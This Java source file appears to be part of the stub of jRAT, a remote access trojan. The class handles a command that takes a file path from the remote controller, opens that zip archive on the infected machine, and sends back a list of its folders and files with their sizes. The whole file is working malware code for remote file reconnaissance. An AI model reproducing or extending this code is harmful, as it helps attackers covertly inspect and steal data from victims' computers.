package pro.jrat.stub.packets.incoming;

import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

import pro.jrat.stub.Connection;
import pro.jrat.stub.packets.outgoing.Packet45ArchivePreview;

public class Packet63PreviewArchive extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();
		ZipFile zip = new ZipFile(file);
		Enumeration<? extends ZipEntry> entries = zip.entries();
		List<ZipEntry> folders = new ArrayList<ZipEntry>();
		List<ZipEntry> files = new ArrayList<ZipEntry>();
		while (entries.hasMoreElements()) {
			ZipEntry entry = entries.nextElement();
			if (entry.isDirectory()) {
				folders.add(entry);
			} else {
				files.add(entry);
			}
		}

		for (ZipEntry entry : folders) {
			Connection.addToSendQueue(new Packet45ArchivePreview(true, entry.getName(), 0L));
		}

		for (ZipEntry entry : files) {
			Connection.addToSendQueue(new Packet45ArchivePreview(false, entry.getName(), entry.getSize() / 1024L));

		}

		zip.close();
	}

}
